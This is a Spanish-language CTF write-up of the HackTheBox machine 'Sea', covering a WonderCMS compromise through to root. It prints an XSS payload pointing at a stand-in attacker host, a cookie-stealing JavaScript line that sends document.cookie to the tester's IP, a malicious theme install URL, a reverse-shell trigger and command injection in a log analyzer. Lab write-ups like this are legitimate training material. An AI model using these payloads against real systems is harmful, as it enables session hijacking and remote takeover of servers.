#ctf-machine #hackthebox #easy-machine #linux 

![[Sea.png]]

## Enumeración inicial
Primeramente lanzamos una traza ICMP a la máquina víctima:
![[Pasted image 20240827143316.png]]

Dado que el TTL es cercano a 64, probablemente estemos ante una máquina Linux ya que suelen tener ese valor de TTL.

### Nmap
Hacemos un primer escaneo con `nmap` para detectar los puertos TCP abiertos de la máquina víctima:
![[Pasted image 20240827143510.png]]

Como vemos, solo hay 2 puertos abiertos, los puertos 22 y 80. Por lo que realizamos un segundo escaneo con `nmap` para detectar la versión y servicio que corren para estos dos puertos:
![[Pasted image 20240827143648.png]]

Como vemos se están ejecutando servicios con versión de Ubuntu por lo que podemos decir que se trata de un sistema Linux. Además, vemos que la cookie "PHPSESSID" no tiene establecida la *flag* de "httponly" por lo que podría acontecerse, si fuera posible, un *cookie-hijacking*.


## Enumeración web
Podemos ejecutar `whatweb` para analizar el contenido web del puerto 80:
![[Pasted image 20240827144035.png]]

Como vemos se está utilizando al *cookie* "PHPSESSID" además de que vemos información parecida a la que nos muestra `nmap`.

Si accedemos a la web vemos la siguiente página principal:
![[Pasted image 20240827144153.png]]

Si clicamos en "How to participate" nos redirige a:
![[Pasted image 20240827144232.png]]

Como vemos hay otro link de contacto que si clicamos nos lleva a:
![[Pasted image 20240827144259.png]]

Por lo que debemos de añadir el dominio en el `/etc/hosts` de nuestra máquina:
![[Pasted image 20240827144415.png]]

Una vez añadido ya podemos ver el contenido:
![[Pasted image 20240827144434.png]]

Podemos hacer una prueba insertando una URL que apunte a nuestra máquina para ver si recibimos la solicitud:
![[Pasted image 20240827144923.png]]

Y como vemos recibimos la solicitud:
![[Pasted image 20240827145058.png]]

Pero no parece haber ninguna forma interesante de acontecer un CSRF. Por lo que hacemos un escaneo de directorios con `gobuster`:
![[Pasted image 20240827151048.png]]

Como vemos hay 4 directorios por lo que empezamos a hacer *fuzzing* en la carpeta `/themes`:
![[Pasted image 20240827151428.png]]

Encontramos un directorio "bike" por lo que podemos buscar archivos dentro de este directorio:
![[Pasted image 20240827151914.png]]

Como vemos hay un archivo llamado "version" que si accedemos a él, vemos la versión del *theme*:
![[Pasted image 20240827151640.png]]

Además si accedemos al archivo "summary" vemos lo siguiente:
![[Pasted image 20240827151832.png]]

Se trata de un tema de bicis animadas. Si accedemos al archivo "LICENSE" vemos el creador:
![[Pasted image 20240827152122.png]]

Si buscamos sobre "turboblack" en Google encontramos lo siguiente:
![[Pasted image 20240827153228.png]]

Por lo que seguramente se trate de una web con WonderCMS 3.2.0.

Si buscamos sobre *exploits* de WonderCMS 3.2.0 encontramos el siguiente recurso:
https://shivamaharjan.medium.com/the-why-and-how-of-cve-2023-41425-wondercms-vulnerability-7ebffbff37d2

Este recurso nos dice que se puede acontecer un XSS si se accede a:
```
somesite.com/wondercms/index.php?page=loginURL?”></form><script+src=”http://attacker.ip/xss.js”></script><form+action=”
```

Por lo que si mandamos una URL por el formulario anterior podremos robarle la cookie de sesión al usuario que revisa las páginas de contacto. Por lo que primero creamos un documento JavaScript malicioso para robar la *cookie* de sessión:
```js
document.location='http://10.10.14.204/cookiestealer.php?c='+document.cookie;
```

Y seguidamente enviamos esto en el formulario:
![[Pasted image 20240827154148.png]]


Por lo que recibimos una *cookie* de sesión:
![[Pasted image 20240827154209.png]]

Si cambiamos la *cookie* en el navegador y recargamos obtenemos acceso como administradores:
![[Pasted image 20240827154342.png]]

Como vemos finalmente se trataba de WonderCMS 3.4.2:
![[Pasted image 20240827154731.png]]

Si buscamos vulnerabilidades para obtener RCE para esta version, vemos que si instalamos un tema malicioso con codigo PHP, podremos obtener una webshell. Por lo que seguimos lo que hace este exploit:
https://github.com/prodigiousMind/CVE-2023-41425/blob/main/exploit.py

Primeramente, proporcionamos desde nuestra máquina el archivo main.zip extraído de:
https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip

Y desde la web como administradores accedemos a:
http://sea.htb/index.php?installModule=http://10.10.14.204/main.zip&directoryName=violet&type=theme&token=72e01e67e2353bdc80a84122e636d08a0fb9fe83dabc1906e932f67ab084edb7

Donde el valor del token lo extraemos desde el código fuente de la web:
![[Pasted image 20240827185040.png]]

Por lo que sí accedemos a http://sea.htb/themes/revshell-main/rev.php tenemos nuestra web shell:
![[Pasted image 20240827185123.png]]

Entonces utilizando los parámetros "lhost" y "lport" podemos entablarnos una *reverse shell*:
http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.204&lport=443

Siempre y cuando nos pongamos en escucha con `nc` en el puerto 443:
![[Pasted image 20240827185313.png]]

Por lo que hacemos el tratamiento de la TTY:
![[Pasted image 20240827185413.png]]
![[Pasted image 20240827185445.png]]


## Escalada de privilegios
Si accedemos a `/var/www/sea/data/` vemos un archivo "database.js" con un *hash*:
![[Pasted image 20240827190234.png]]

Podemos intentar *crackearlo* con `hashcat`, pero debemos de quitarle los *scape* `\`:
![[Pasted image 20240827190429.png]]

Como vemos `hashcat` nos dice que se trata del modo "bycrypt" por lo que ejecutamos ese modo junto al diccionario "rockyou.txt":
```bash
hashcat -m 3200 '$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q' /usr/share/wordlists/rockyou.txt
```

![[Pasted image 20240827190653.png]]

Como vemos conseguimos la contraseña por lo que podemos intentar utilizarla para migrar a otro usuario:
![[Pasted image 20240827191701.png]]

Conseguimos convertirnos en el usuario "amay". Si accedemos a su `/home` podemos ver la primera *flag*:
![[Pasted image 20240827191754.png]]

Si listamos los puertos internos abiertos con `netstat` vemos el puerto 8080 que es bastante extraño.
![[Pasted image 20240827194845.png]]

Por lo que nos transferimos `chisel` a la máquina víctima para poder hacer un *port forwarding*:
![[Pasted image 20240827195052.png]]![[Pasted image 20240827195104.png]]

Y lo ejecutamos para que el puerto 8080 de la máqiuna vícitma se convierta en el puerto 8080 de nuestra máquina:
![[Pasted image 20240827213813.png]]
![[Pasted image 20240827213850.png]]

Una vez hecho el *port forwarding*, podemos hacer un escaneo con `nmap` del puerto 8080 de nuestra máquina (que equivale al de la máquina víctima):
![[Pasted image 20240827214017.png]]

Como vemos se trata de PHP por lo que podemos acceder a la web y ver su contenido:
![[Pasted image 20240827214053.png]]

Nos pide usuario y contraseña por lo que podemos probar con las credenciales del usuario actual "amay":
![[Pasted image 20240827214142.png]]

Obtenemos acceso a lo que parece ser un analizador de *logs*. Si analizamos con `burpsuite` como se tramita la "data" al clicar "analyze", vemos lo siguiente:
![[Pasted image 20240827214609.png]]

Como vemos se está insertando el archivo a visualizar. Si intentamos visualizar archivos como el `/etc/shadow` no podremos, pero sí intentamos concatenar un comando con ";" tenemos RCE:
![[Pasted image 20240827220044.png]]
![[Pasted image 20240827215930.png]]


Por lo que podemos crear un comando que permita obtener una "bash" como *root*:
![[Pasted image 20240827222207.png]]

Finalmente, ejecutamos el binario de "bash" que se ha creado y obtenemos una "bash" como *root*:
![[Pasted image 20240827222111.png]]

Así que si accedemos al directorio `/root` podemos visualizar la última, *flag*:
![[Pasted image 20240827222308.png]]

___
#xss #cookie-hijacking #file-upload-attacks #hash-cracking #abusing-internal-services #command-injection
___
